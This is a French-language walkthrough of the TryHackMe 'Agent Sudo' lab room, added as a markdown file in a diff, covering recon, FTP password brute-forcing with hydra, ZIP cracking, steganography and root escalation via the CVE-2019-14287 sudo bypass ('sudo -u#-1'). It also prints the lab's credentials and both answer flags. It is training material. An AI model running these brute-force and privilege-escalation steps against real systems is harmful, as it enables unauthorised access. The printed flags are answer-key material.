@@ -1,0 +1,131 @@
+# Agent Sudo — TryHackMe Writeup
+
+**Difficulté :** Easy  
+**Points :** 390  
+**Catégories :** Web, FTP, Stéganographie, Privilege Escalation, CVE  
+
+---
+
+## Résumé
+
+Room axée sur l'énumération, la stéganographie et l'exploitation d'une CVE sudo. La chaîne d'exploitation passe par un User-Agent personnalisé, du brute-force FTP, plusieurs couches de stéganographie, et finalement une escalade de privilèges via CVE-2019-14287.
+
+---
+
+## Reconnaissance
+
+```bash
+nmap -sV -sC 10.128.156.162
+```
+
+**Ports ouverts :**
+- 21/tcp — vsftpd 3.0.3
+- 22/tcp — OpenSSH 7.6p1
+- 80/tcp — Apache 2.4.29
+
+---
+
+## Task 2 — Enumération web
+
+La page d'accueil indique d'utiliser son **codename comme User-Agent** pour accéder au site.
+
+```bash
+curl -s -L http://10.128.156.162 -A "C"
+```
+
+Réponse : message adressé à **chris** avec mention d'un mot de passe faible.
+
+---
+
+## Task 3 — Brute-force & Stéganographie
+
+### FTP Brute-force
+
+```bash
+hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.128.156.162
+```
+
+**Credentials FTP :** `chris:crystal`
+
+### Récupération des fichiers
+
+```
+ftp 10.128.156.162
+get To_agentJ.txt
+get cute-alien.jpg
+get cutie.png
+```
+
+### Extraction du ZIP depuis cutie.png
+
+```bash
+binwalk -e --run-as=root cutie.png
+cd _cutie.png.extracted
+zip2john 8702.zip > zip.hash
+john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
+# Mot de passe : alien
+7z x 8702.zip
+cat To_agentR.txt
+# Contient : 'QXJlYTUx' (base64)
+echo "QXJlYTUx" | base64 -d
+# Résultat : Area51
+```
+
+### Extraction stéganographique du JPG
+
+```bash
+steghide extract -sf cute-alien.jpg -p Area51
+cat message.txt
+```
+
+**SSH credentials :** `james:hackerrules!`
+
+---
+
+## Task 4 — User Flag
+
+```bash
+ssh james@10.128.156.162
+cat user_flag.txt
+```
+
+**User flag :** `b03d975e8c92a7c04146cfa7a5a313c7`
+
+---
+
+## Task 5 — Privilege Escalation (CVE-2019-14287)
+
+```bash
+sudo -l
+# (ALL, !root) /bin/bash
+```
+
+La configuration sudo autorise james à lancer bash en tant que n'importe quel utilisateur **sauf root**. La CVE-2019-14287 permet de contourner cette restriction avec l'UID `-1` qui est interprété comme l'UID `0` (root).
+
+```bash
+sudo -u#-1 /bin/bash
+cat /root/root.txt
+```
+
+**Root flag :** `b53a02f55b57d4439e3341834d70c062`
+
+---
+
+## Résumé des flags
+
+| Flag | Valeur |
+|------|--------|
+| User flag | `b03d975e8c92a7c04146cfa7a5a313c7` |
+| Root flag | `b53a02f55b57d4439e3341834d70c062` |
+
+---
+
+## Techniques utilisées
+
+- Manipulation du header HTTP `User-Agent`
+- Brute-force FTP avec Hydra
+- Analyse de fichiers avec Binwalk
+- Craquage de ZIP avec John the Ripper
+- Décodage Base64
+- Stéganographie avec Steghide
+- Exploitation CVE-2019-14287 (sudo bypass)
